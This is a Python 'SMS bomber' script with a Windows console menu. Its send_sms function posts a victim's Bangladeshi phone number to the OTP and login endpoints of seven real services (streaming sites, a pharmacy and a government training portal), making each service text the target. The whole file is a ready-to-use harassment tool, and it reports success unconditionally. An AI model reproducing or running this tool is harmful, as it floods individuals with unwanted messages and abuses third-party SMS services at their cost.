import requests


def send_sms(number):
    # Format number with +880
    number_with_code = f"+880{number}" if not number.startswith(
        "+880") else number
    # Format number without +880
    number_without_code = number.replace("+880", "")

    urls = [
        {
            "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
            "payload": {"number": number_with_code}
        },
        {
            "url": "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
            "payload": {"phoneNumber": number_with_code}
        }, {
            "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
            "payload": {"mobile": number_without_code}
        }, {
            "url": "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=145.0.0.0&os=Windows&osv=10.0",
            "payload": {"mobile": number_without_code}
        }, {
            "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
            "payload": {"number": number_with_code}
        }, {
            "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
            "payload": {"number": number_with_code}
        },
        {
            "url": "https://api.apex4u.com/api/auth/login",
            "payload": {"phoneNumber": number_without_code}
        }
    ]

    for i, api in enumerate(urls, 1):
        try:
            response = requests.post(api["url"], json=api["payload"])
            if response.status_code == 200:
                print(f"{i}. Success")
            else:
                print(f"{i}. Failed")
        except:
            print(f"{i}. Failed")


if __name__ == "__main__":
    RED = "\033[1;31m"
    YELLOW = "\033[1;33m"
    CYAN = "\033[1;36m"
    GREEN = "\033[1;32m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

    banner = f"""
{RED}
  ██████╗  ██████╗ ███╗   ███╗██████╗ ██╗███╗   ██╗ ██████╗
  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██║   ██║██╔████╔██║██████╔╝██║██╔██╗ ██║██║  ███╗
  ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██║██║╚██╗██║██║   ██║
  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝██║██║ ╚████║╚██████╔╝
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝
{RESET}{YELLOW}
  ╔══════════════════════════════════════════════════════╗
  ║        💣  SMS BOMBER  •  BY SUMON  💣               ║
  ║    ⚡  Coded with Python  |  Handle with care  ⚡    ║
  ╚══════════════════════════════════════════════════════╝
{RESET}"""

    import msvcrt
    import os

    SELECTED = "\033[1;32m"   # green highlight for selected item
    DIM = "\033[2;37m"   # dim gray for unselected

    menu_items = ["💣  Start Bombing", "🚪  Exit"]

    def draw_menu(selected_idx):
        os.system("cls")
        print(banner)
        print(f"{CYAN}  ┌─────────────────────────────────────┐{RESET}")
        print(
            f"{CYAN}  │{RESET}   {YELLOW}Use ↑ ↓ arrows  +  Enter to select  {CYAN}│{RESET}")
        print(f"{CYAN}  ├─────────────────────────────────────┤{RESET}")
        for i, item in enumerate(menu_items):
            if i == selected_idx:
                print(f"{CYAN}  │{RESET}  {SELECTED}❯  {item}{RESET}" +
                      " " * (30 - len(item)) + f"  {CYAN}│{RESET}")
            else:
                print(f"{CYAN}  │{RESET}  {DIM}   {item}{RESET}" +
                      " " * (30 - len(item)) + f"  {CYAN}│{RESET}")
        print(f"{CYAN}  └─────────────────────────────────────┘{RESET}")

    selected = 0
    while True:
        draw_menu(selected)
        key = msvcrt.getwch()
        if key == '\xe0':          # arrow key prefix on Windows
            key = msvcrt.getwch()
            if key == 'H':         # UP arrow
                selected = (selected - 1) % len(menu_items)
            elif key == 'P':       # DOWN arrow
                selected = (selected + 1) % len(menu_items)
        elif key == '\r':          # Enter
            if selected == 0:      # Start Bombing
                os.system("cls")
                print(banner)
                print(f"{CYAN}  ┌─────────────────────────────────────┐{RESET}")
                number = input(
                    f"{CYAN}  │ {YELLOW}📱 Enter number (without +880): {CYAN}    │{RESET}\n{GREEN}  ▶  {RESET}")
                print(f"{CYAN}  └─────────────────────────────────────┘{RESET}")
                print(f"\n{YELLOW}  🚀 Bombing started... Please wait{RESET}\n")
                send_sms(number)
                print(f"\n{GREEN}  ✅ All SMS sent successfully!{RESET}")
                print(f"\n{CYAN}  Press any key to return to menu...{RESET}")
                msvcrt.getwch()
            elif selected == 1:    # Exit
                os.system("cls")
                print(f"\n{RED}  👋 Goodbye!{RESET}\n")
                break
